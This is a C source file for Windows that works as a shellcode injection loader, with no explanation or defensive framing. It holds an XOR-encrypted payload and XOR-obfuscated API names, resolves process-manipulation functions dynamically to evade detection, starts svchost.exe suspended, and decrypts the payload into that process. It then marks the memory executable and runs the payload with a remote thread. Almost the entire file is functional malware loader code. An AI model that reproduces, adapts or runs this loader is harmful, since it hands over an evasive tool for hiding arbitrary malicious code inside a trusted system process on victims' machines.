#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] =
"\x9b\x4b\x86\xd9\x8d\x01\x90\x4d\xe2\x9c\xec\x7a\x3c\x61\xfd\x34"
"\x2c\x32\xf4\xc9\x84\x8e\xf1\x85\xa5\x6e\xc0\xbf\x08\xd6\x25\x83"
"\xfe\x82\xb0\x6e\xf3\x0a\xa2\x16\xdd\x86\xe7\x30\x69\x43\x66\x93"
"\x5b\x5d\xb9\xe7\xe4\xb7\x63\xbc\xdd\x34\xd1\xa5\xc9\x08\x34\xf3"
"\x13\x97\xba\xbe\xfc\x6e\x60\xca\xdd\x8e\x71\x90\xc9\x8c\xd1\xd9"
"\x11\x51\xd9\x6f\xfc\xd4\xf2\x46\xa9\x64\x7f\xc2\xad\xa3\x27\x52"
"\x92\x11\xa9\xa7\x75\x07\xdf\xb8\xd4\x54\x4b\x4b\xd3\xa3\xed\xd1"
"\x67\x54\xe9\x76\x3f\x65\xba\xea\x95\x05\x4b\x45\x41\xf7\x01\xdb"
"\x5a\xcc\xb8\x2d\xfc\xfd\x76\x61\xd5\x25\x4a\xc1\x51\x60\x30\xdb"
"\xa4\xd5\xa9\x2d\x80\x6d\x7a\xeb\x43\x48\x32\x09\xc9\xb2\xa6\x3f"
"\x1a\xdd\x21\xab\xf5\xe4\xf3\xd2\x75\x70\xf2\x8c\x82\xcf\x42\x9b"
"\x1e\x25\x39\xd3\x6c\xbd\x76\x61\xd5\x21\x4a\xc1\x51\xe5\x27\x18"
"\x57\x54\xac\x2d\xf4\xf9\x7b\xeb\x45\x44\x88\xc4\x09\xcb\x67\x43"
"\x1a\x44\xa9\xfe\xea\xbc\x68\xab\xcd\x44\x5a\x81\xdb\xcb\xe5\x7f"
"\x7b\x5d\xba\x59\x54\xbd\x73\xb3\xcf\x4d\x88\xd2\x68\xd4\x99\x6c"
"\xa4\x41\xa1\x18\xc3\x96\x00\xb5\xa6\x37\x03\xc0\xc0\xd5\x2f\x1a"
"\xbd\x54\x69\x4a\x14\xe4\x32\xea\xdc\x8c\xe6\x89\x3d\x81\x66\x97"
"\x89\xb0\xf0\x26\x40\xa4\x66\xa3\x1c\xe1\x4f\x49\x70\xc2\xdc\xdf"
"\x2c\x3a\xef\x59\x61\xa9\xbb\x00\xfd\x04\x02\xc0\x81\xda\x27\x29"
"\x72\x9c\x83\xa6\x4b\x30\x62\xba\xd8\x34\xca\x8d\xb0\x43\x2e\x6c"
"\x9b\x54\x61\x64\xfc\x1a\xf2\xa2\x1c\xc4\x42\x7a\x6b\x8c\xb9\x73"
"\xa4\xc9\xa0\x2f\x73\x8f\x22\xab\xcd\x49\x8a\x22\xc9\x0a\x9f\xd2"
"\xe1\x85\x4d\xd2\xd5\x1a\xe7\xa2\x14\xc1\x43\xc2\x81\x83\x2f\x2b"
"\x38\x71\x8c\xa6\xb4\xe5\x32\xea\xd4\x55\x42\x90\xc9\x0a\x84\xc4"
"\x0c\x4b\xa5\x97\x74\x8f\x3f\xb3\xd4\x55\xe1\x3c\xe7\x44\x22\xb7"
"\x0f\x1d\xe9\xee\x39\xa1\x16\xf2\x53\x05\x6b\x88\x08\x65\x30\xc3"
"\x1a\x4c\xa9\xf6\xf5\xb5\x7b\x15\x55\x44\x53\x89\x7e\x4b\x2b\x1a"
"\x9a\x50\x61\x67\xf5\x5f\x4b\x26\xaa\x83\xfc\x15\xc9\xb2\xb4\xdb"
"\xa4\xd6\x63\xa8\xf5\x5f\x3a\x6d\x88\x65\xfc\x15\x3a\x73\xd3\x31"
"\x0d\x5d\x52\x00\x21\x58\xaf\x15\x40\x4d\x80\x04\xa9\xbf\x60\xef"
"\x51\x9c\x13\x46\xc1\xe0\x89\xad\x86\x77\x6c\xaa\x81\xda\x27\x1a"
"\x81\xe3\x3d\xa6\xb4\xe5\x32";

void xor_decrypt(unsigned char *buf, size_t len,
const unsigned char *key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

void xor_inplace(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len-1; i++) {
        buf[i] ^= key;
    }
}


//process definitions

typedef int (WINAPI *IS_create_process)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef HWND (WINAPI *IS_open_process)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

typedef LPVOID (WINAPI *IS_Virt_Alloc)(
    HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL (WINAPI *IS_write_mem)(
    HANDLE hProcess,
    LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

typedef HANDLE (WINAPI *IS_create_thread)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

typedef BOOL (WINAPI *IS_virt_prot)(
  HANDLE hProcess,
    LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  DWORD *lpflOldProtect
);




int main() {

    //Hide Console
  HWND console = GetConsoleWindow();
  //ShowWindow(console, SW_HIDE);    



  //initial handles and memory needs
  HANDLE ph;
  HANDLE rt;
  DWORD pid;
  STARTUPINFO si = {sizeof(si)};
  PROCESS_INFORMATION pi = {0};
  DWORD oldProt = 0;



  //load handle to kernel32
  HMODULE hWin32 = LoadLibraryA("kernel32.dll");
  if (!hWin32){
  return -1;}

  //load create process
  char CeA[] = "\x19\x28\x3f\x3b\x2e\x3f\x0a\x28\x35\x39\x3f\x29\x29\x1b";
  xor_inplace(CeA, sizeof(CeA), 0x5a);
    IS_create_process create_proc = (IS_create_process)GetProcAddress(hWin32, CeA);
    if (!create_proc){
  return -2;}

  //load open process
  char Ops[] = "\x15\x2a\x3f\x34\x0a\x28\x35\x39\x3f\x29\x29";
  xor_inplace(Ops, sizeof(Ops), 0x5a);
IS_open_process open_proc = (IS_open_process)GetProcAddress(hWin32, Ops);
    if (!open_proc){
  return -2;}

  //load virtual Alloc
  char VVx[] = "\x0c\x33\x28\x2e\x2f\x3b\x36\x1b\x36\x36\x35\x39\x1f\x22";
  xor_inplace(VVx, sizeof(VVx), 0x5a);
IS_Virt_Alloc virt_alloc = (IS_Virt_Alloc)GetProcAddress(hWin32, VVx);
if(!virt_alloc){
return -2;
}

//load write memory
char Wyy[] = "\x0d\x28\x33\x2e\x3f\x0a\x28\x35\x39\x3f\x29\x29\x17\x3f\x37\x35\x28\x23";
xor_inplace(Wyy, sizeof(Wyy), 0x5a);
IS_write_mem write_mem = (IS_write_mem)GetProcAddress(hWin32, Wyy);
if(!write_mem){
return -2;
}

//load create remote thread
char Cad[] = "\x19\x28\x3f\x3b\x2e\x3f\x08\x3f\x37\x35\x2e\x3f\x0e\x32\x28\x3f\x3b\x3e";
xor_inplace(Cad, sizeof(Cad), 0x5a);
IS_create_thread create_thread = (IS_create_thread)GetProcAddress(hWin32, Cad);
if(!create_thread){
return -2;
}

//load virtual protect
char Vtx[] = "\x0c\x33\x28\x2e\x2f\x3b\x36\x0a\x28\x35\x2e\x3f\x39\x2e\x1f\x22";
xor_inplace(Vtx, sizeof(Vtx), 0x5a);
IS_virt_prot virt_prot = (IS_virt_prot)GetProcAddress(hWin32, Vtx);
if(!virt_prot){
return -2;
}



  // creates svchost suspended with my own function
  create_proc(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, //Command-Line
    NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);

  // open process with my own function
  ph = open_proc(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);

  //allocate memory in remote process
  LPVOID rb = virt_alloc(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);



// Allocate writable buffer
    size_t enc_len = sizeof(my_payload);
    unsigned char *buf = malloc(enc_len);
    if (!buf) return 1;
    memcpy(buf, my_payload, enc_len);

    // XOR key
    const unsigned char key[] = {
        0xD3, 0x7A, 0x4F, 0x91, 0x0C, 0xE8, 0x56, 0xB2,
        0x1D, 0x63, 0xA4, 0xF7, 0x39, 0x8E, 0x02, 0xCB
    };  
    size_t key_len = sizeof(key);

    // Decrypt
    xor_decrypt(buf, enc_len, key, key_len);


  //write payload
    write_mem(ph, rb, buf, enc_len, NULL);

//give process execute rights
virt_prot(ph, rb, enc_len, PAGE_EXECUTE_READWRITE, &oldProt);

//create remote thread
  rt = create_thread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  if(!rt){
    printf("err thread not created");
    return -3;
  }
  CloseHandle(ph);
  return 0;
}
